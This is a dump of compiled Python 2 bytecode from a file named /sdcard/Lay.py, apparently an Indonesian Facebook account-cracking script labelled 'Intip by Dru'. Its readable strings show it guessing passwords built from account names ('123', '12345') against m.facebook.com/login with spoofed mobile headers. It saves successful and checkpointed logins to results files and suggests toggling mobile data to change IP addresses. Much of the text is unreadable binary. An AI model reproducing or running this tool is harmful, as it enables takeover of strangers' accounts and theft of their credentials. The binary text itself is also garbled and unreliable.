 r}d' a& n n Xd t) | | t& t f GHd( | | t& f } t j |  t d) t t t  f d   j! d! |  Pq= q= q= Wt  d* 7a  d  S(+   NsC    [[1;96m*[0m] Intip : %s/%s [1;92mOK:%s [0m- [1;93mCP:%s [0mRÊ   s   Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501g    ÐsAg    8|As   x-fb-connection-bandwidthi N  i@  s   x-fb-sim-hnis   x-fb-net-hniRË   s   x-fb-connection-qualitys!   cell.CTRadioAccessTechnologyHSDPAs   x-fb-connection-types
   user-agents!   application/x-www-form-urlencodeds   content-typeRÌ   s   x-fb-http-engines   https://m.facebook.com/RÚ   s   https://m.facebook.com/loginRv   R   Rë   t   c_usert   ;s   %s=%ss    %sID: %s|%s %s     %ss    [â] %s|%s|%ss   results/OK-%s-%s-%s.txtR<   s   %s
Rî   s   __dru__.txtR?   s-   https://graph.facebook.com/%s?access_token=%sR   Rt   s    [â] %s|%s %ss   results/CP-%s-%s-%s.txti   (*   RÜ   R   R@   R#   R$   R   R   R   RÝ   R,   Rx   R    Rm   RÞ   R2   t   SessionR3   RÚ   t   updateRo   t   urlt   cookiest   get_dictt   keyst   joint   itemsR   R   Rz   R'   R_   R`   Ra   R   RA   R4   R5   R6   Rá   R9   RB   R!   (   R²   R   Râ   Rã   t   umobileRå   t   sest   bt   keyt   valuet   kukiRè   R:   Ré   Rê   (    (    s   /sdcard/Lay.pyR¾   ^  sL    )t&A'	'c         C   sq
  t  d t t f  } | d k r/ |  j   n>
| d k rd t GHd t t t t t t t t t f	 GHd t t t t t t t t t f	 GHd t GHd t t t f GHd t GHt	 d	 d
  } x|  j
 D]} yz| j d  } | d j d  } t |  d k r/| d | d d | d d g } nt |  d k r| d | d d | d d | d | d d | d d g } n­t |  d k rö| d | d d | d d | d | d d | d d | d | d d | d d g	 } n;t |  d k r| d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d g } n¬ t |  d k r1| d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d g } n  | j |  j | d |  WqÌ qÌ XqÌ WWd  QXd t t t f GHt j |  j  t t t  t   nÔ| d k rd t GHd t t t t t t t t t f	 GHd t t t t t t t t t f	 GHd t GHd t t t f GHd t GHt	 d	 d
  } x|  j
 D]} yz| j d  } | d j d  } t |  d k r| d | d d | d d g } nt |  d k rî| d | d d | d d | d | d d | d d g } n­t |  d k r`| d | d d | d d | d | d d | d d | d | d d | d d g	 } n;t |  d k rï| d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d g } n¬ t |  d k r| d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d g } n  | j |  j | d |  Wq6q6Xq6WWd  QXd t t t f GHt j |  j  t t t  t   nj| d k rm
d t GHd t t t t t t t t t f	 GHd t t t t t t t t t f	 GHd t GHd t t t f GHd t GHt	 d	 d
  } x|  j
 D]} yz| j d  } | d j d  } t |  d k r| d | d d | d d g } nt |  d k rX| d | d d | d d | d | d d | d d g } n­t |  d k rÊ| d | d d | d d | d | d d | d d | d | d d | d d g	 } n;t |  d k rY	| d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d g } n¬ t |  d k r
| d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d | d | d d | d d g } n  | j |  j | d |  Wq q Xq WWd  QXd t t t f GHt j |  j  t t t  t   n  d  S(   Ns    
 [%s?%s] Pilihan Metode Anda : RL   RM   RS   s5    %s==================================================s8    [%sâ%s] Hasil %sOK%s ke : %sresults/OK-%s-%s-%s.txt%ss8    [%sâ%s] Hasil %sCP%s ke : %sresults/CP-%s-%s-%s.txt%sse    [%s!%s] %sMatikan data selular untuk menjeda proses &
 Merefresh Cache IP Address agar lebih Stabil.R¶   i   s   <=>i   Rt   i    t   123t   12345i   i   i   i   s,   
 %s[%sâ%s] Proses Intip by Dru Selesai...RN   RT   RO   t   03(   RM   RS   (   RN   RT   (   RO   R  (   R.   R!   R   RÇ   R   R_   R`   Ra   R   R¸   R@   R¹   R   Rº   R»   R,   R{   R¼   R%   R#   R$   R"   R½   R¾   (   R²   Re   RÀ   t   yntkst   bbt   xzt   raimuuu(    (    s   /sdcard/Lay.pyRÇ     sð    	$$		&&&&&
	$$		&&&&&
	$$		&&&&&(   t   __name__t
   __module__R³   R^   R»   R½   R¾   RÇ   (    (    (    s   /sdcard/Lay.pyR]     s   		n	,	+	.t   __main__(I   R,   R2   t   ImportErrorR-   R*   t   concurrent.futurest
   concurrentt   bs4R   R   t
   subprocessRm   R   Rß   R4   R   R¸   R   R   t   nowt   ctt   montht   nt   bulanR"   t   nTempt
   ValueErrort   currentt   yearRa   t   but   dayR_   R`   t   reloadt   setdefaultencodingR   R   R   R!   R/   t   UR0   R   t   my_colorRn   t   warnaR#   R$   R@   R   RÜ   t   pwxRá   R   R   R3   R6   RF   RE   R%   R1   RK   RG   R8   RY   RZ   R[   R\   Rc   Rd   R]   R
  (    (    (    s   /sdcard/Lay.pyt   <module>   s   &&&l	*
			

			
	&	4	K		+	,	,	,	¿	ÿ w